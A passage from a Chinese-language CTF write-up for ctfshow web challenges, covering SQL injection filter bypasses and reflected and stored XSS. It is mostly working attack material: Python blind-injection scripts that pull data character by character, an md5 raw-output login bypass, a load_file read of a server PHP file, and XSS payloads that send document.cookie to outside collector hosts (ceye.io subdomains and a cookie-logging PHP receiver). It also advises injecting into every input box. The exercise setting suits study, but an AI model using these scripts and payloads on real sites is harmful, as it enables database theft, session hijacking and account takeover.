    return preg_match('/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into/i', $str);
  }
```

不允许select or and flag into =

用like+正则 

tableName=`ctfshow_user`where`pass`like'%25c%25'，直接POST上去。

然后，使用盲注脚本：

```
import requests

url = 'http://59418fd8-bd5f-4fd3-bc04-9997ef8ac8e4.challenge.ctf.show/select-waf.php'

flagstr = '1234567890asdfghjklqwertyuiopzxcvbnm-_{}'
flag = 'ctfshow{'

for i in range(50):
    for x in flagstr:
        data = {
            'tableName': f"`ctfshow_user`where`pass`regexp'{flag + x}'"
        }
        res = requests.post(url=url, data=data)
        if res.text.find('user_count = 1;') > 0:
            flag += x
            print('++++++++++++++++++++++++right:   ' + x)
            break
        else:
            print('+++++++++++++++++wrong:  ' + x)
    print(flag)

```

运行即可发现flag的值会一点一点拼出来，直到括号闭合成功后即可停止脚本执行提交flag。



### web184

```
  function waf($str){
    return preg_match('/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into|where|\x26|\'|\"|union|\`|sleep|benchmark/i', $str);
  }
```

这题过滤了where，‘ ，",*,等符号，目的是使用左右连接查询进行注入。

已知条件：flag格式：ctfshow{ 这个字符开头。

好多wp和官方视频没有解释为什么要使用$user_count=43,来做判断条件，基本不好的小白就很难受了。

payload: tableName= ctfshow_user as a left join ctfshow_user as b on a.pass regexp([CONCAT](https://so.csdn.net/so/search?q=CONCAT&spm=1001.2101.3001.7020)(char(99),char(116),char(42)) ) 

$user_count=43. 这里根据返回结果43，就可以判断我们的payload是执行正确的，精确操作了数据表中带flag值的行：具体可以分析一下我们的payload。

又得盲注了，

```
import requests
import sys

url = 'http://74cb8d43-be70-4911-becb-97bc98d25e45.challenge.ctf.show/select-waf.php'
flag = 'ctfshow{'
letter = "0123456789abcdefghijklmnopqrstuvwxyz-{}"

def asc2hex(s):
    a1 = ''
    a2 = ''
    for i in s:
        a1+=hex(ord(i))
    a2 = a1.replace("0x","")
    return a2
for i in range(100):
    for j in letter:
        payload = {
            "tableName":"ctfshow_user group by pass having pass like {}".format("0x"+asc2hex(flag+j+"%"))
        }
        r = requests.post(url=url,data=payload).text
        if "$user_count = 1;" in r:
            flag+=j
            print(flag)
            break
            if j == "}":
                sys.exit()

```

![](.\SQL注入\web184\web184.png)



### web185-186

```
  function waf($str){
    return preg_match('/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\x00|\#|\x23|[0-9]|file|\=|or|\x7c|select|and|flag|into|where|\x26|\'|\"|union|\`|sleep|benchmark/i', $str);
  }
```

数字被过滤了，需要构造。

```
import requests
import sys

def createNum(n):
    num = "true"
    if n == 1:
        return "true"
    else:
        for i in range(n - 1):
            num += "+true"
    return num


def createstrNum(m):
    _str = ""
    for j in m:
        _str += ",chr(" + createNum(ord(j)) + ")"
    return _str[1:]


url = "http://33db22fa-e601-49f4-a311-7ba9a21a915c.challenge.ctf.show/select-waf.php"
letter = "0123456789abcdefghijklmnopqrstuvwxyz-{}"
flag = "ctfshow{"
for i in range(100):
    for j in letter:
        data = {
            'tableName': 'ctfshow_user group by pass having pass like concat({})'.format(createstrNum(flag + j + "%"))
        }
        res = requests.post(url=url, data=data).text
        # print(res)
        if "$user_count = 1;" in res:
            flag += j
            print(flag)
            break
        if j == "}":
            sys.exit()

```

![](.\SQL注入\web185-186\web185.png)

![](.\SQL注入\web185-186\web186.png)



### web187

```
    $username = $_POST['username'];
    $password = md5($_POST['password'],true);

    //只有admin可以获得flag
    if($username!='admin'){
        $ret['msg']='用户名不存在';
        die(json_encode($ret));
    }
```

POST上username且必须为admin，password有md5检验。

注意到md5(string,true)这个函数

md5(string,raw)其中raw参数可选，且有两种选择

FALSE：32位16进制的字符串
TRUE：16位原始二进制格式的字符串
当有true这个参数，会以二进制的形式输出16个字符。返回的这个原始二进制不是普通的0 1二进制。

> 在mysql里面，在用作布尔型判断时，以1开头的字符串会被当做整型数。要注意的是这种情况是必须要有单引号括起来的，比如password=‘xxx’ or ‘1xxxxxxxxx’，那么就相当于password=‘xxx’ or 1 ，也就相当于password=‘xxx’ or true，所以返回值就是true。当然在我后来测试中发现，不只是1开头，只要是数字开头都是可以的。
> 当然如果只有数字的话，就不需要单引号，比如password=‘xxx’ or 1，那么返回值也是true。（xxx指代任意字符）

```
import requests

url = 'http://ba40e41c-7293-4031-bc46-860fbc112f03.challenge.ctf.show/select-waf.php'
url2 = ' http://ba40e41c-7293-4031-bc46-860fbc112f03.challenge.ctf.show/api/'

payload = {
    "username":"admin",
    "password":"ffifdyop"
}

#r = requests.post(url=url,data=payload)
res = requests.post(url=url2,data=payload).text

print(res)

```

![](.\SQL注入\web187\web187.png)

### web188

```
  //用户名检测
  if(preg_match('/and|or|select|from|where|union|join|sleep|benchmark|,|\(|\)|\'|\"/i', $username)){
    $ret['msg']='用户名非法';
    die(json_encode($ret));
  }

  //密码检测
  if(!is_numeric($password)){
    $ret['msg']='密码只能为数字';
    die(json_encode($ret));
  }

  //密码判断
  if($row['pass']==intval($password)){
      $ret['msg']='登陆成功';
      array_push($ret['data'], array('flag'=>$flag));
    }
      
```

mysql中字母与数字的比较过程：

以字母为开头的字符型数据在与数字型比较时，会强制转化为0，再与数字比较（这里很类似于PHP的弱比较）
假设我们username为0，那么就会相等，从而匹配成功

在这里的password是用0来混字母开头的$row['pass']

```
import requests

url = 'http://106c7788-8a93-4a71-ab55-e09f7ecddca2.challenge.ctf.show/api/'

payload = {
    "username":"0",
    "password":"0"
}

res = requests.post(url=url,data=payload).text

print(res)

```

![](.\SQL注入\web188\web188.png)

通过检测后，waf直接给了flag



### web189

```
flag在api/index.php文件中
```

```
import requests
import sys
import json

url = 'http://c1f50290-9488-499d-b94a-01abe27e29c0.challenge.ctf.show/api/index.php'
flag = 'ctfshow{'
letter = '0123456789abcdefghijklmnopqrstuvwxyz-{}'

for i in range(100):
    for j in letter:
        payload = {
            "username": "if(load_file('/var/www/html/api/index.php')regexp('{}'),0,1)".format(flag + j),
            "password": "0"

        }
        r = requests.post(url=url,data=payload)
        #print(r)
        if "密码错误" == r.json()['msg']:
            flag += j
            print(flag)
            break
        if '}' in flag:
            sys.exit()

```



![](.\SQL注入\web189\web189.png)









## XSS

> document.cookie							用于js获取当前网页的cookie值
> window.location.href					 用于获取当前页面地址链接
> window.location.href='www.baidu.com'	  用于相当于跳转地址
>
> 服务器准备的接收文件：xss.php
> <?php
> $cookie=$_GET['cookie'];
> $myfile=fopen('cookie.txt','w+');
> fwirte($myfile,$cookie);
> fclose($myfile);
> ?>
>
> http://[ip]/xss.php?cookie=document.cookie		用于给服务器发送当前界面的coolie
> window.location.href='http://[ip]/xss.php?cookie='+document.cookie	用于指向服务器ip并把当前界面的cookie值作为get参数发送过去
>
> 最后的js语句payload：
> <script>window.location.href='http://[ip]/xss.php?cookie='+document.cookie</script>

### web316

去**控制台**输入以下指令：alert(document.cookie)

得到的信息为：

```
PHPSESSID=ptnd4qql435ille8hetr5bkij4; flag=you%20are%20not%20admin%20no%20flag
```

在ceye网站上注册临时域名，用它来反射出cookie。

payload：

```
<script> var img=document.createElement("img"); img.src="http://hi8y3b.ceye.io/"+document.cookie; </script>
```

在后台里面得到flag

![](.\XSS\图片\web316.png)

经历了30多分钟，不容易啊。

对payload的解释：

```
var img=document.createElement("img");  //这个是生成一个img对象
img.src="http://hi8y3b.ceye.io/"+document.cookie; 
/*是加载一张图片加上当前的cookie这里我们填写的是接收平台的地址，所以带上document.cookie去加载地址然后平台会有记录cookie的值，ctf平台会有个虚拟机器人，充当admin身份，每隔一段时间点开网站它一点开就会加载payload，发送它自身的cookie在那个框内输入那个标签输进去，网站一加载就执行了我们输入的xss代码然后他自己会发送cookie*/
```



### web317

用上一次的payload试了一下，不行。

因为带有过滤了

思路：用body语句生成可绕过过滤的payload：

```
<body onload="window.open('http://hi8y3b.ceye.io/'+document.cookie)"></body>
```

此时会因为window.open()的作用弹出新的窗口，上面写着

```
{"meta": {"code": 201, "message": "HTTP Record Insert Success"}}
```

说明消息发送成功，那XSS应该也反弹生效了，回ceye查看后台可获得flag

![](.\XSS\图片\web317.png)



### web318

过滤条件增加了

```
<body onload="window.open('http://hi8y3b.ceye.io/'+document.cookie)"></body>
```

这个payload依旧管用，先用着。

![](.\XSS\图片\web318.png)



### web319

过滤条件又增加了

```
<body onload="window.open('http://hi8y3b.ceye.io/'+document.cookie)"></body>
```

但这个payload依旧坚挺。

![](.\XSS\图片\web319.png)





### web320

不知道过滤了什么，一个个试。

```
document.cookie">
+document.cookie">
xss='+document.cookie">
='http://[ip]/xss.php?xss='+document.cookie">
="document.location.href='http://[ip]/xss.php?xss='+document.cookie">
onload="document.location.href='http://[ip]/xss.php?xss='+document.cookie">
```

以上这些都是能够正常上传的，但再加上前面的一个空格就不行了，从而可知过滤的是空格

替换方法还是有的：`tab、/**/`

payload:

```
<body/**/onload="window.open('http://we1wmh.ceye.io/'+document.cookie)"></body>
```

结果：

```
{"meta": {"code": 201, "message": "HTTP Record Insert Success"}}
```

![](.\XSS\图片\web320.png)



### web321-326

```
<body/**/onload="window.open('http://we1wmh.ceye.io/'+document.cookie)"></body>
```

过滤了XSS，但我没有用过。

![](.\XSS\图片\web321.png)



### web327(VPS)

现在开始，学习存储型XSS

> 嵌入到web页面的恶意HTML会被存储到应用服务器端，简而言之就是会被存储到数据库（日志等也可），等用户打开页面时，会继续执行恶意代码，能够持续的攻击用户。
>
> 如何操作存储型XSS： 嵌入到web页面的恶意代码被存储到服务器上，例如在注册时候将用户昵称设置为XSS恶意代码，那么访问某些页面会显示用户名的时候就会触发恶意代码。
>
> JS属于前端代码，如果植入恶意代码成功，JS代码是不会显示出来的。
>
> 存储型XSS与反射型XSS的区别： 存储型存入数据库中，可持续时间长，而反射型持续时间短，仅对本次访问有影响，反射型一般要配合社工。
>
> 存储型XSS可以通过弹窗验证，不过不建议，会破坏网站结构，引起管理员的主意。
>
> 存储型XSS可能出现的位置：
> （1）用户注册
> （2）留言板
> （3）上传文件的文件名处
> （4）管理员可见的报错信息
> （5）在线聊天框
> （6）客服
> （7）问题反馈区
> （8）邮件信箱
> 理论上，见框就插。

```
<body/**/onload="document.location.herf='http://we1wmh.ceye.io/'+document.cookie"></body>
```

